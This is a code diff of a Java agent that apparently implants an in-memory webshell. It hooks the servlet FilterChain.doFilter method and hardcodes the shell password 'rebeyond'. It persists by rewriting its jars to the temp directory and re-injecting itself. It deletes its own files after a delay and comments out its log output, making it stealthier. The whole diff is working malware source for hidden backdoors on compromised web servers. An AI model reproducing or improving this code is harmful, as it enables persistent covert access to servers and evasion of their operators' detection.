@@ -1,24 +1,20 @@
 package cn.com.x1001;
 
-/**
- * @author x1001 
- * 2020/11/17
- *
- */
-
-import cn.com.x1001.bean.ClassInfo;
+import cn.com.x1001.bean.HookClass;
 import cn.com.x1001.bean.InstrumentationContext;
 import cn.com.x1001.hook.HookTransformer;
 
 import java.io.*;
 import java.lang.instrument.Instrumentation;
+import java.lang.management.ManagementFactory;
+import java.lang.management.RuntimeMXBean;
 import java.util.Arrays;
 
 public class Agent {
     //打印输出
     public static PrintStream out = System.out;
     public static InstrumentationContext context = new InstrumentationContext();
-    public static String currentPath ;
+    public static String currentPath;
     public static String password = "rebeyond";
     public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};
 
@@ -30,8 +26,8 @@ public class Agent {
         } else {
             Agent.currentPath = args;
         }
-        out.println("Agent password:"+Agent.password);
-        out.println("Agent currentPath:"+Agent.currentPath);
+        out.println("Agent password:" + Agent.password);
+        out.println("Agent currentPath:" + Agent.currentPath);
         start(inst);
     }
 
@@ -59,16 +55,17 @@ public class Agent {
         try {
             readInjectFile(Agent.currentPath);
             readAgentFile(Agent.currentPath);
-            clear(Agent.currentPath);
+            clear();
             persist();
         } catch (Exception e) {
-            System.out.println(e);
+//            System.out.println(e);
         }
 
     }
+
     public static void writeFiles(String fileName, byte[] data) throws Exception {
         String tempFolder = System.getProperty("java.io.tmpdir");
-        System.out.println("写入文件路径："+tempFolder);
+//        System.out.println("写入文件路径：" + tempFolder);
         FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
         fso.write(data);
         fso.close();
@@ -77,22 +74,23 @@ public class Agent {
     /**
      * 添加hook点
      */
-    public static void addHook(){
-        ClassInfo classInfo = new ClassInfo();
-        classInfo.setClassName("javax/servlet/FilterChain");
-        classInfo.addMethodDesc("doFilter", null);
-        context.getClassHashSet().add(classInfo);
+    public static void addHook() {
+        HookClass hookClass = new HookClass();
+        hookClass.setClassName("javax/servlet/FilterChain");
+        hookClass.addMethodDesc("doFilter", null);
+        context.getClassHashSet().add(hookClass);
     }
+
     public static void persist() {
         try {
-            out.println("persist add");
+//            out.println("persist add");
             Thread t = new Thread() {
                 public void run() {
                     try {
-                        out.println("persist start");
+//                        out.println("persist start");
                         writeFiles("inject.jar", Agent.injectFileBytes);
                         writeFiles("shell-agent.jar", Agent.agentFileBytes);
-                        out.println("persist end");
+//                        out.println("persist end");
                         startInject();
                     } catch (Exception e) {
 
@@ -137,23 +135,16 @@ public class Agent {
 
     public static void readInjectFile(String filePath) throws Exception {
         String fileName = "inject.jar";
-        File f = new File(filePath + File.separator + fileName);
-        if (!f.exists()) {
-            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
-        }
-        InputStream is = new FileInputStream(f);
-        byte[] bytes = new byte[1024 * 100];
-        int num = 0;
-        while ((num = is.read(bytes)) != -1) {
-            injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
-        }
-        is.close();
+        readFile(filePath, fileName);
     }
 
     public static void readAgentFile(String filePath) throws Exception {
         String fileName = "shell-agent.jar";
+        readFile(filePath, fileName);
+    }
+
+    private static void readFile(String filePath, String fileName) throws Exception {
         File f = new File(filePath + File.separator + fileName);
-        System.out.println(f.getAbsolutePath());
         if (!f.exists()) {
             f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
         }
@@ -166,19 +157,33 @@ public class Agent {
         is.close();
     }
 
-    public static void clear(String currentPath) throws Exception {
+    public static void clear() throws Exception {
         Thread clearThread = new Thread() {
             String currentPath = Agent.currentPath;
 
             public void run() {
                 try {
+//                    System.out.println("delete path:" + currentPath);
                     Thread.sleep(5000);
                     String injectFile = currentPath + "inject.jar";
                     String agentFile = currentPath + "shell-agent.jar";
-                    new File(injectFile).getCanonicalFile().delete();
+
                     String OS = System.getProperty("os.name").toLowerCase();
-                    out.println("file delete success!!!");
-                    new File(agentFile).delete();
+                    //TODO exe打包不进去。windows暂且无法删除
+                    //                        try {
+                    //                            unlockFile(currentPath);
+                    //                        } catch (Exception e) {
+                    //                            System.out.println(e.getMessage());
+                    //                        }
+
+                    boolean delete1 = new File(injectFile).getCanonicalFile().delete();
+                    boolean delete2 = new File(agentFile).delete();
+//                    if (delete1 && delete2) {
+//                        out.println("file delete success!!!");
+//                    } else {
+//                        out.println("file delete failed!!!");
+//                    }
+
                 } catch (Exception e) {
                     out.println(e);
                 }
@@ -194,6 +199,10 @@ public class Agent {
 //        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
 //        byte[] bytes = new byte[1024 * 100];
 //        int num = 0;
+//        if (is == null){
+//            System.out.println("exe 读取为空");
+//            return;
+//        }
 //        while ((num = is.read(bytes)) != -1) {
 //            fos.write(bytes, 0, num);
 //            fos.flush();
@@ -209,6 +218,7 @@ public class Agent {
 //        }
 //        new File(exePath).delete();
 //    }
+//
 //    public static String getCurrentPid() {
 //        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
 //        return runtimeMXBean.getName().split("@")[0];
